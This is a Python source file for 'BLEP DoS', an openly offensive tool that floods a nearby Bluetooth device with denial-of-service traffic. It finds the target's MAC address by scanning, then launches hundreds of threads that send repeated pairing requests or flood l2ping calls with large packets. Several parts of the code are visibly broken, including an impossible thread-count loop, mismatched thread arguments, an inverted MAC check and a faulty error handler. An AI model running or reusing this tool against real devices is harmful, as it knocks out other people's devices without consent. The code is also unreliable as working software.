# BLEP DoS (Bluetooth Low Energy Paired Denial of Serice)
# By Sean Kells
# NEEDS PYTHON 3.3 <
import time
import os
import threading
import sys
import bluetooth
import re

MAC = re.compile(r'(?:[0-9a-fA-F]:?){12}')

def intro():
    """
    intro function prints a logo of the program.
    
    Return: Nothing
    """
    os.system("clear")
    
    print("                          BLEP DoS                          ")
    print("+----------------------------------------------------------+")
    print("|       ____  __    __________     ____       _____        |")
    print("|      / __ )/ /   / ____/ __ \   / __ \____ / ___/        |")
    print("|     / __  / /   / __/ / /_/ /  / / / / __ \\__ \          |")
    print("|    / /_/ / /___/ /___/ ____/  / /_/ / /_/ /__/ /         |")
    print("|   /_____/_____/_____/_/      /_____/\____/____/          |")
    print("|                                                          |")
    print("+----------------------------------------------------------+")
    print("\n")


def pairingDOS(id, target):
    """
    --- ATTACK TYPE 1 ---
    pairingDOS performs a pairing with the target.  While weak alone, the overhead is signficiant together
    
    id: ID of the thread
    target: MAC address of the target
    
    Return: Nothing
    """
    blueInterface= bluetooth.Bluetoothctl()

    blueInterface.pair(target)


    print(id, "Exiting thread...")
    return


def l2pingDOS(id, target, packetsize):
    """
    --- ATTACK TYPE 2 ---
    l2pingDOS performs a L2CAP large ping attack.  While weak alone, strong together

    id: ID of the thread
    target: MAC address of the target
    packetsize: size of the data in the packet

    Return: Nothing
    
    """
    os.system('l2ping -i hci0 -s ' + str(packetsize) +' -f ' + target)

    print(id, "Exiting Thread...")


def findMAC(target):
    """
    findMAC function takes in a Device Name and scans local bluetooth devcies for any matches then returns the
    device name's corresponding MAC Address.  If it cannot find it for an extended period of time (5 seconds)
    function will ask if you want to continue

    target: Device Name of target

    Return: MAC address of target
    """
    blueInterface= bluetooth.Bluetoothctl()

    # Start scan
    blueInterface.start_scan()

    # Let's search for our device
    attempts = 0
    while not MAC.match(target):
        attempts += 1

        # Found devices
        found_devices = blueInterface.get_available_devices()
        for device in found_devices:
            # If Device Name Matches
            if device['name'] == target:
                blueInterface.close_scanner()
                return device['mac_address']

            # Should we continue?
            if attempts >= 5 and input("The desired device was not found... Continue searching? <Y/N> ").upper() == 'Y':
                attempts = 0
            else:
                print("Exiting...")
                blueInterface.close_scanner()
                exit()


def commandline():
    """
    commandline function is called from main and triggers when sufficient system arguments are provided.  Speed use for testing and attacking.
    NO INTERACTIONS OTHER THAN ESCAPE SCAN

    sys.argv[0]: file name
    sys.argv[1]: target <Device Name/MAC Address>
    sys.argv[2]: Attack Type <1 (pairing)/2 (l2ping)>
    sys.argv[3]: Thread Number


    Return: Nothing
    """
    target = sys.argv[1]

    # If entry is a device name, find MAC with it
    if not MAC.match(target):
        target = findMAC(target)
    
    # Threading
    for i in range(0, int(sys.argv[3])):
        if int(sys.argv[2]) == 1:
            threading.Thread(target=pairingDOS, args=[str(i), str(target)]).start()
        else:
            threading.Thread(target=l2pingDOS, args=[str(i), str(target), str(600)]).start()
    


def interactive():
    """
    interative function is called from main and triggers when no/insufficient system arguments are provided.  This interactive mode is for users new to the 
    tool

    Return: Nothing
    """
    # Variables
    have_mac = ""
    target = ""
    attackType = 0
    numThreads = 0


    # Let's show off that logo
    intro()

    print ("Enter help for further input instructions")

    # Do you have MAC Identity Address
    while have_mac != "Y" and have_mac != "N":
        have_mac = input("Do you have MAC Address of target <Y/N>: ").upper()
    
    # Enter target MAC identity or Device Name
    while target == "":
        target = input("MAC Address <ex: AB:CD:EF:GH:IJ:12>: " if have_mac == "Y" else "Device Name: ")
        if have_mac == "Y" and MAC.match(target):
            target = ""

    # Choose attack type
    while attackType != 1 and attackType != 2:
        attackType = int(input("Choose Attack Type: 1 (pairing), 2 (l2ping)"))

    # Choose number of threads
    while numThreads <= 0 and numThreads > 1000:
        numThreads = input("Number of threads: ")
        numThreads = input("Choose Number of threads <Recommended 500>: ")
        if numThreads.lower() == "help":
            print("The entered input must be 0 - 1000.  This is the number of threads you will attack with.")

    # Powering on and setting default agent
    os.system("bluetoothctl default-agent")
    os.system("bluetoothctl power on")

    # Detecting MAC if have_mac == 'N'
    if have_mac == 'N':        
        target = findMAC(target)

    # Beginning Attack
    print("Starting the attack...")

    # Threading
    for _ in range(0, numThreads):
        if attackType == 1:
            threading.Thread(target=pairingDOS, args=[str(target)]).start()
        else:
            threading.Thread(target=l2pingDOS, args=[str(target), str(600)]).start()

    return


def main():
    """
    main function is the initial entry and creates the threads for the
    desired DoS attack.

    Return: Nothing
    """
    # BLEPDoS.py <str>target <int>attacktype <int>numThreads
    if len(sys.argv) == 4:
        # COMMANDLINE MODE
        commandline()
        
    else:
        # INTERATIVE MODE
        interactive()

    return


if __name__ == '__main__':
    try:
        starttime = time.time()
        main()
    except KeyboardInterrupt:
        print("\n\nAbort Successful")
        print("Total time run:", time.time() - starttime)
        exit(0)
    except Exception as e:
        print("ERROR: [ " + e + " ]")
        exit(1)
